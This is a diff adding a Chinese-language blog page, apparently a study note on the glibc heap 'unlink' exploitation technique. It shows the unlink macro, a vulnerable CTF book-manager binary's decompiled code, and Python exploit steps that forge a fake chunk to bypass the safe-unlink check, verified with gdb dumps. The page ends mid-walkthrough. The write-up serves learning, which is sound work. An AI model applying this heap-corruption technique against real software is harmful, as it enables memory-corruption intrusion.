@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="总结这里先说总结，详细的下面说 总的下来，要利用unlink必须满足三个条件：  &amp;P的地址已知（保存堆指针的地址） &amp;P-0x18到&amp;P这段空间可写 至少得有一个off-by-one来修改要free掉的chunk的size位。  目前感觉就这三个条件，但是例题在2.27下复现失败了，暂时还不知道为啥 知识点Unlink对应解链的意思，其在libc里是一个宏定义，作用是将一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Unlink">
+<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/07/Unlink/index.html">
+<meta property="og:site_name" content="CharonPt的Blog">
+<meta property="og:description" content="总结这里先说总结，详细的下面说 总的下来，要利用unlink必须满足三个条件：  &amp;P的地址已知（保存堆指针的地址） &amp;P-0x18到&amp;P这段空间可写 至少得有一个off-by-one来修改要free掉的chunk的size位。  目前感觉就这三个条件，但是例题在2.27下复现失败了，暂时还不知道为啥 知识点Unlink对应解链的意思，其在libc里是一个宏定义，作用是将一">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-05-07T09:29:42.000Z">
+<meta property="article:modified_time" content="2022-05-07T18:29:18.496Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="堆">
+<meta property="article:tag" content="unlink">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/07/Unlink/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Unlink | CharonPt的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CharonPt的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/07/Unlink/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Unlink
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-05-07 17:29:42" itemprop="dateCreated datePublished" datetime="2022-05-07T17:29:42+08:00">2022-05-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-08 02:29:18" itemprop="dateModified" datetime="2022-05-08T02:29:18+08:00">2022-05-08</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里先说总结，详细的下面说</p>
+<p>总的下来，要利用unlink必须满足三个条件：</p>
+<ol>
+<li><code>&amp;P</code>的地址已知（保存堆指针的地址）</li>
+<li><code>&amp;P-0x18</code>到<code>&amp;P</code>这段空间可写</li>
+<li>至少得有一个off-by-one来修改要free掉的chunk的size位。</li>
+</ol>
+<p>目前感觉就这三个条件，但是例题在2.27下复现失败了，暂时还不知道为啥</p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>Unlink对应解链的意思，其在libc里是一个宏定义，作用是将一个chunk从双向链表中取出，而且其还会检测与取出的这个chunk的物理相邻的位置是否还有free chunk，如果有则会触发向前合并（跟物理低地址的chunk合并）/向后合并（跟物理高地址的chunk合并）</p>
+<p>结合unlink源码的一部分来看</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    <span class="comment">// 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               </span><br><span class="line">    FD = P-&gt;fd;                                                                      </span><br><span class="line">    BK = P-&gt;bk;                                                                      </span><br><span class="line">    <span class="comment">// 防止攻击者简单篡改空闲的 chunk 的 fd 与 bk 来实现任意写的效果。</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;                                                                      </span><br><span class="line">        FD-&gt;bk = BK;                                                             </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+
+<h4 id="关于FD-gt-bk和BK-gt-fd"><a href="#关于FD-gt-bk和BK-gt-fd" class="headerlink" title="关于FD-&gt;bk和BK-&gt;fd"></a>关于FD-&gt;bk和BK-&gt;fd</h4><p>关于这个东西始终有些细节不太确定，所以干脆自己写个程序来确定一下。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">size_t</span> prev_size;</span><br><span class="line">	<span class="keyword">size_t</span> size;</span><br><span class="line">	<span class="keyword">char</span>* fd;</span><br><span class="line">	<span class="keyword">char</span>* bk;</span><br><span class="line">&#125;chunk,*pchunk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">size_t</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">size_t</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	<span class="built_in">free</span>(p1);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">free</span>(p3);</span><br><span class="line"></span><br><span class="line">	pchunk ptr = p2<span class="number">-2</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ptr = %p\n&quot;</span>, ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;&amp;ptr = %p\n&quot;</span>, &amp;ptr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ptr-&gt;fd = %p\n&quot;</span>, ptr-&gt;fd);</span><br><span class="line">	pchunk FD = ptr-&gt;fd;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FD = %p\n&quot;</span>,FD);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;FD-&gt;bk = %p\n&quot;</span>,FD-&gt;bk);</span><br><span class="line">	pchunk BK = ptr-&gt;bk;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;BK = %p\n&quot;</span>,BK);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;BK-&gt;fd = %p\n&quot;</span>,BK-&gt;fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为unlink应用于双向链表，所以我malloc了三块大于fast bin的chunk，然后先后释放。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smallbins</span><br><span class="line">0xa0: 0x602180 —▸ 0x6020c0 —▸ 0x602000 —▸ 0x7ffff7dd1c08 (main_arena+232) ◂— 0x602180</span><br></pre></td></tr></table></figure>
+
+<p>然后让结构体指针ptr指向chunk2的头部，也就是说此时<code>ptr = 0x6020c0</code></p>
+<p>首先是<code>ptr-&gt;fd</code>，很简单，一共分成两步</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0x4006e1 &lt;main+187&gt;    mov    rax, qword ptr [rbp - 0x38]</span><br><span class="line">  0x4006e5 &lt;main+191&gt;    mov    rax, qword ptr [rax + 0x10]</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>[rbp - 0x38] == 0x6020c0 == ptr</code>，<code>[rax + 0x10] == *(ptr + 2) == 0x602000</code></p>
+<p>综合起来其实也就一步：<code>*(ptr + 2)</code></p>
+<p>那么<code>FD-&gt;bk</code>呢？一共分成两步</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► 0x40071d &lt;main+247&gt;    mov    rax, qword ptr [rbp - 0x18]</span><br><span class="line">  0x400721 &lt;main+251&gt;    mov    rax, qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>[rbp - 0x18] == FD == 0x602000</code>，<code>[rax + 0x18] == *(FD + 3) = 0x6020c0</code></p>
+<p>综合起来其实还是一步：<code>*(FD + 3)</code></p>
+<p>到这里为止其实就可以说明<code>FD-&gt;bk</code>这条指令其实等效于<code>*(*(ptr + 2) + 3)</code>，在这个例子中，<code>ptr == 0x6020c0</code>，那么<code>FD-&gt;bk</code>也就等效于<code>*(*(0x6020c0 + 0x10) + 0x18)</code></p>
+<p>同样的道理，<code>BK-&gt;fd</code>等效于<code>*(*(ptr + 3) + 2) == *(*(0x6020c0 + 0x18) + 0x10)</code></p>
+<h4 id="用一道题目来讲"><a href="#用一道题目来讲" class="headerlink" title="用一道题目来讲"></a>用一道题目来讲</h4><p>（本题是<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV11q4y1E7E2?spm_id_from=333.788.top_right_bar_window_history.content.click">【星盟安全】PWN系列教程 第20节 Unlink</a> 教程里的例题，在libc-2.23环境）</p>
+<p>首先是创建堆块的函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> id; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me a book ID: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;id);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;how long: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">  result = id;</span><br><span class="line">  <span class="keyword">if</span> ( id &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = id;</span><br><span class="line">    <span class="keyword">if</span> ( id &lt;= <span class="string">&#x27;1&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( size &lt; <span class="number">0</span> || *(&amp;chunk + id) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;too large!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v3 = id;</span><br><span class="line">        *(&amp;chunk + v3) = <span class="built_in">malloc</span>(size);	<span class="comment">//在这里将堆指针放到了.bss段上</span></span><br><span class="line">        Size[v3] = size;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!\n&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本题没开PIE，所以知道chunk的位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:0000000000602300 chunk           dq ?                    ; DATA XREF: init+7C↑o</span><br><span class="line">.bss:0000000000602300                                         ; add+83↑r ...</span><br><span class="line">.bss:0000000000602308                 db    ? ;</span><br></pre></td></tr></table></figure>
+
+<p>然后是一个有堆溢出的edit功能函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Which book to write?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;how big?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;chunk + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    read_0(*(&amp;chunk + v1), v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>剩下一个正常的free功能函数就不贴了，本题没有show功能函数。</p>
+<p>接下来就是重点，也是我卡了好几天才稍微搞懂的一些点：</p>
+<ol>
+<li><p>在unlink宏中，传进去的P指针：</p>
+<p>① 向后合并（向低地址合并）时，传进去的P指针的值实际上是“当前要free掉的chunk的头部 - prev size”（也就是低地址的chunk的头部）（这里还有一点不懂，如果传进去的P指针是低地址的chunk的头部的话，那么P-&gt;fd跟P-&gt;bk是在这期间写进低地址chunk里面的吗）。</p>
+<p>② 向前合并（向高地址合并）时，因为当前要free掉的chunk就是低地址chunk，所以传进去的P指针就是当前chunk的头部</p>
+</li>
+<li><p>向后合并：向低地址合并时就要判断低地址的chunk是否空闲，所以可以直接判断当前chunk的P位是否为0以及是否有prev size，如果判断为空闲，就用unlink合并。</p>
+<p>向前合并：因为要判断高地址chunk是否空闲，所以要去查看更高地址的chunk（下下个chunk）的P位以及其是否有prev size，如果判断为空闲，就用unlink合并。找到下下个chunk的方法就是 “当前chunk的头部地址+当前chunk的size+下一个chunk的size”。</p>
+</li>
+<li><p>绕过<code>if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))</code>的方法</p>
+<p>知道了1、2两点之后，我们回到例题</p>
+<p>首先申请四块chunk</p>
+</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0xf0</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x100</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在add功能函数中我们知道，从0x602300这个地址开始会保存堆指针，如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x602300</span><br><span class="line">0x602300 &lt;chunk&gt;:	0x0000000001955010	0x0000000001955050</span><br><span class="line">0x602310 &lt;chunk+16&gt;:	0x0000000001955150	0x0000000001955260</span><br><span class="line">0x602320 &lt;chunk+32&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>再来看前两个chunk中的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x0000000001955000</span><br><span class="line">0x1955000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1955010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955020:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955040:	0x0000000000000000	0x0000000000000101</span><br><span class="line">0x1955050:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>接下来就是触发unlink的过程：</p>
+<ol>
+<li><p>在chunk0的数据段中伪造一个chunk，以及用堆溢出修改chunk1的prev size和size</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fd = <span class="number">0x00602300</span>-<span class="number">0x18</span></span><br><span class="line">bk = <span class="number">0x00602300</span>-<span class="number">0x10</span></span><br><span class="line">fake_chunk = p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">fake_chunk += p64(fd) + p64(bk)</span><br><span class="line">fake_chunk += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">fake_chunk += p64(<span class="number">0x30</span>) + p64(<span class="number">0x100</span>)	<span class="comment">#将chunk1的prev size改成fake_chunk的大小，以及size的低一bit置零</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x60</span>,fake_chunk)</span><br></pre></td></tr></table></figure>
+
+<p>修改完之后两个chunk中的数据如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x1955000</span><br><span class="line">0x1955000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1955010:	0x0000000000000000	0x0000000000000031	=&gt;从这里开始属于fake_chunk</span><br><span class="line">0x1955020:	0x00000000006022e8	0x00000000006022f0</span><br><span class="line">0x1955030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955040:	0x0000000000000030	0x0000000000000100</span><br><span class="line">0x1955050:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这里我们将fake_chunk的fd设置成了<code>&amp;chunk0 - 0x18</code>，bk设置成了<code>&amp;chunk0 - 0x10</code>，接下来我们就讲原因</p>
+<p>① 首先我们这里准备的是向后合并，也就是向低地址合并，所以我们修改了chunk1的prev size以及size，我们最后会通过free掉chunk1来触发unlink的向后合并。那么我们如上修改完之后，unlink时传进去的P指针的值是多少呢？答案就是chunk1的头部地址 - prev size，也就是<code>P = 0x1955040 - 0x30 = 0x1955010</code></p>
+<p>② 那么我们就知道<code>FD = P-&gt;fd == *(0x1955010 + 0x10) == 0x6022e8</code>，<code>BK = P-&gt;bk == *(0x1955010 + 0x18) == 0x6022f0</code></p>
+<p>那么显而易见，<code>FD-&gt;bk == *(0x6022e8 + 0x18) == *(0x602300) == 0x1955010 == P</code>，同时<code>BK-&gt;fd == *(0x6022f0 + 0x10) == *(0x602300) == 0x1955010 == P</code></p>
+<p>因为<code>0x1955010</code>上面存放的就是<code>P</code>的地址，所以我们就能够通过这样的构造从而来绕过unlink的检测</p>
+</li>
+<li><p>然后我们free掉chunk1，再来看看两个堆中的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x1955000</span><br><span class="line">0x1955000:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x1955010:	0x0000000000000000	0x0000000000000131</span><br><span class="line">0x1955020:	0x00007faf0229bb78	0x00007faf0229bb78</span><br><span class="line">0x1955030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1955040:	0x0000000000000030	0x0000000000000100</span><br><span class="line">0x1955050:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>可以看到chunk1跟fake_chunk合并了，并且放到了unsorted bin中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: 0x1955010 —▸ 0x7faf0229bb78 (main_arena+88) ◂— 0x1955010</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>那么到这里为止我们实现了什么效果呢？我们可以看到在unlink源码中的这一部分</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;                                                                      </span><br><span class="line">        FD-&gt;bk = BK;                                                             </span><br><span class="line">        BK-&gt;fd = FD;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
+
+<p>最后unlink会将<code>FD(0x6022e8)</code>写进<code>BK-&gt;fd(0x602300)</code>中</p>
